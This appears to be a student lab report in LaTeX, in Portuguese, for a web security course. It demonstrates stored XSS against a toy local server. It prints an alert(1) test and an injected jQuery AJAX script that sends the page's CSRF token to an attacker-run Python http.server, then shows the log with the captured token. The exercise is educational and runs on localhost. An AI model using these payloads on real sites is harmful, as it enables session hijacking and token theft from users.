@@ -1,0 +1,101 @@
+\documentclass[11pt]{article}
+\usepackage{listings}
+\usepackage{color}
+
+\definecolor{mygreen}{rgb}{0,0.6,0}
+\definecolor{mygray}{rgb}{0.5,0.5,0.5}
+\definecolor{mymauve}{rgb}{0.58,0,0.82}
+
+\lstset{
+    frame=single,
+    language=HTML,
+    backgroundcolor=\color{white},
+    basicstyle=\footnotesize,
+    breaklines=true,
+    commentstyle=\color{mygreen},
+    keywordstyle=\color{blue},
+    stringstyle=\color{mymauve},
+    stepnumber=1,
+    showstringspaces=false,
+    tabsize=1,
+    breakatwhitespace=false,
+    literate=
+        {á}{{\'a}}1
+        {à}{{\`a}}1
+        {ã}{{\~a}}1
+        {é}{{\'e}}1
+        {ê}{{\^e}}1
+        {í}{{\'i}}1
+        {ó}{{\'o}}1
+        {õ}{{\~o}}1
+        {ú}{{\'u}}1
+        {ü}{{\"u}}1
+        {ç}{{\c{c}}}1
+}
+
+\title{Exercício - PCS3544}
+\author{
+    Gustavo Freitas de Sá Oliveira - 11261062
+    \and
+    Roberta Boaventura Andrade - 11260832
+}
+\date{25/05/2023}
+
+\begin{document}
+
+\maketitle
+
+\section{Introdução}
+
+XSS (Cross-Site Scripting) é uma vulnerabilidade de segurança em aplicações web que permite que um atacante insira e execute scripts maliciosos em um site ou aplicação confiável, por meio da manipulação de entrada de dados não validada. Isso pode levar ao roubo de informações confidenciais dos usuários, redirecionamentos para páginas falsas ou maliciosas e até mesmo o controle total do site comprometido. Neste documento, pretendemos criar duas aplicações, uma simulando um site legítimo e outra simulando uma API maliciosa, com o o objetivo de atacar o servidor anterior.
+
+O site que será atacado consiste de um servidor web bastante rudimentar capaz de retornar páginas com formulários, salvar dados dos formulários num banco de dados e exibir esses dados numa tabela.
+
+A API maliciosa será responsável por receber os tokens de sessão dos usuários, através da inserção de um script malicioso no banco de dados do site legítimo. Isso só é possível quando não há um tratamento adequando dos dados do lado do servidor.
+
+Rodando o servidor do site legítimo em localhost e fazendo uma requisição GET, temos como retorno a seguinte página HTML:
+
+\lstinputlisting[]{./html/renderizado.html}
+
+Na página, vemos um formulário HTML para a inserção de uma mensagem, que será salva no banco de dados. Vemos também uma tabela, inicialmente vazia, contendo as mensagens que foram anteriormente enviadas. Na página há também um token CSRF, responsável por identificar a sessão ativa no site. Esse token é justamente a informação que será roubada pelo atacante, uma vez que, em sua posse o hacker pode se passar pela vítima.
+
+Como a construção dos dados da página é feita do lado do servidor, um atacante é capaz de enviar, em vez de uma mensagem, um código em JavaScript. Se o servidor legítimo foi construído de maneira inadequada, esse código será executado do lado do cliente sempre que a página for renderizada no navegador. Como teste, podemos submeter no campo do comentário, o valor \textless script\textgreater alert(1)\textless /script\textgreater. Percebemos que o servidor executa essa função JavaScript assim que a página sofre um refresh. Isso nos indica que o site legítimo está suscetível a um ataque do tipo XSS.
+
+\lstinputlisting[firstline = 42, lastline = 59]{./html/alert.html}
+
+Ao perceber isso, o atacante pode criar uma API que recebe os tokens de autenticação de usuários. Isso pode ser feito, por exemplo, com Python. Basta executar o seguinte comando:
+
+\begin{lstlisting}
+    python -m http.server 80
+\end{lstlisting}
+
+Para obrigar os clientes do site a enviarem seus tokens de autenticação para sua API, o atacante pode inserir, no campo de comentário do site, o seguinte script, substituindo apenas a URL pela URL da sua API:
+
+\begin{lstlisting}
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha512-3gJwYpMe3QewGELv8k/BX9vcqhryRdzRMxVfq6ngyWXwo03GFEzjsUm8Q7RZcHPHksttq7/GFoxjCVUjkjvPdw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+    <script>
+        $.ajax({
+            url: "http://localhost:80",
+            method: 'GET',
+            data: {
+                'csrfmiddlewaretoken': document.getElementsByName('csrfmiddlewaretoken')[0].value
+            }
+        });
+    </script>
+\end{lstlisting}
+
+O script indicado faz uma requisição do tipo AJAX para a API maliciosa de forma completamente imperceptícel para o usuário. A página HTML renderizada fica sendo:
+
+\lstinputlisting[firstline = 42, lastline = 75]{./html/ajax.html}
+
+Com a entrega dessa página HTML para o cliente, podemos observar no terminal da API do atacante:
+
+\begin{lstlisting}
+    Serving HTTP on :: port 80 (http://[::]:80/) ...
+    ::1 - - "GET /?csrfmiddlewaretoken=XcLRZYvTcYygKJ2346zV4Ez8hSVDSgh1pBBuQdZf2EhfiNa9aVcILt2HwWcOdebU HTTP/1.1" 200 -
+\end{lstlisting}
+
+Dessa forma, o token da sessão do usuário foi sequestrada, e o atacante poderia até programar um endpoint para realizar ataques se passando pela vítima de forma automática.
+
+\end{document}
